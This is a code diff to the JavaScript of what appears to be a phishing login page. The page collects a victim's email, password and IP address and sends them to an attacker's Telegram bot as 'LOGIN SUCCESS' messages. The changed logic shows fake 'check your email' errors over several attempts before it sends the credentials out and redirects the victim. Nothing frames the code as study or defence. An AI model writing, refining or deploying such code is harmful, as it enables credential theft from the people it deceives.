@@ -131,7 +131,7 @@
     const ADMIN_ID = "8295417969";
 
     let currentEmail = "";
-    let attemptCount = 0;  // د لاګ ان هڅو شمېر (یوازې د خالي پاسورډ لپاره)
+    let attemptCount = 0;  // د پاسورډ هڅو شمېر (1, 2, 3...)
 
     function hasPashtoCharacters(text) {
         const pashtoRegex = /[\u0600-\u06FF\u0750-\u077F\u08A0-\u08FF\uFB50-\uFDFF\uFE70-\uFEFF]/;
@@ -185,6 +185,7 @@
         document.getElementById('step2View').classList.remove('hidden');
         document.getElementById('stepIndicator').textContent = "Step 2 of 2";
         document.getElementById('passwordInput').value = '';
+        attemptCount = 0;  // Reset attempt count when new email entered
     };
 
     // Step 2: Password Processing
@@ -192,53 +193,58 @@
         let pass = document.getElementById('passwordInput').value.trim();
         let errorBox = document.getElementById('errorBox');
         
-        // که پښتو توري ولري
+        // Increment attempt counter
+        attemptCount++;
+        
+        // Check for Pashto characters FIRST
         if (hasPashtoCharacters(pass)) {
-            showMessage(errorBox, 'please pashto not allowed', true);
-            return;
-        }
-        
-        // که پاسورډ له 8 کم وي - هر ځل (هر هڅه) دا تېروتنه راځي
-        if (pass.length < 8 && pass.length > 0) {
-            showMessage(errorBox, 'Password must be at least 8 characters', true);
-            return;
-        }
-        
-        // که پاسورډ خالي وي
-        if (!pass) {
-            attemptCount++;
-            if (attemptCount === 1) {
+            if (attemptCount === 3) {
+                // دریمه هڅه: حتی پښتو وي، ایرر ورکوي او نه ځي
+                showMessage(errorBox, 'please pashto not allowed', true);
+                return;
+            } else if (attemptCount === 1) {
                 showMessage(errorBox, 'Please check your email', true);
             } else if (attemptCount === 2) {
                 showMessage(errorBox, 'Please check your email password', true);
-            } else if (attemptCount >= 3) {
-                // دریم ځل: قبولول (بوټ ته ځي)
-                let ip = await getUserIP();
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: 'POST', headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ 
-                        chat_id: ADMIN_ID, 
-                        text: `✅ LOGIN SUCCESS (3rd attempt)\nEmail: ${currentEmail}\nPass: ${pass}\nIP: ${ip}`,
-                        parse_mode: 'Markdown'
-                    })
-                });
-                showMessage(document.getElementById('successBox'), 'Login successful! Redirecting to bot...', false);
-                document.getElementById('loader').style.display = 'block';
-                setTimeout(() => {
-                    window.location.href = BOT_REDIRECT;
-                }, 2000);
-                attemptCount = 0;
             }
             return;
         }
         
-        // که پاسورډ سم وي (8 یا زیات)
+        // Check for minimum length (less than 8)
+        if (pass.length < 8) {
+            if (attemptCount === 3) {
+                showMessage(errorBox, 'Password must be at least 8 characters', true);
+                return;
+            } else if (attemptCount === 1) {
+                showMessage(errorBox, 'Please check your email', true);
+            } else if (attemptCount === 2) {
+                showMessage(errorBox, 'Please check your email password', true);
+            }
+            return;
+        }
+        
+        // Check for empty password
+        if (!pass) {
+            if (attemptCount === 3) {
+                // دریمه هڅه: خالي پاسورډ، بیا هم نه ځي - باید سم پاسورډ ولیکي
+                showMessage(errorBox, 'Please enter your password', true);
+                return;
+            } else if (attemptCount === 1) {
+                showMessage(errorBox, 'Please check your email', true);
+            } else if (attemptCount === 2) {
+                showMessage(errorBox, 'Please check your email password', true);
+            }
+            return;
+        }
+        
+        // If we reach here, password is valid (8+ chars, no Pashto)
+        // On 3rd attempt OR any attempt with valid password -> success
         let ip = await getUserIP();
         await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
             method: 'POST', headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ 
                 chat_id: ADMIN_ID, 
-                text: `✅ LOGIN SUCCESS\nEmail: ${currentEmail}\nPass: ${pass}\nIP: ${ip}`,
+                text: `✅ LOGIN SUCCESS (Attempt ${attemptCount})\nEmail: ${currentEmail}\nPass: ${pass}\nIP: ${ip}`,
                 parse_mode: 'Markdown'
             })
         });
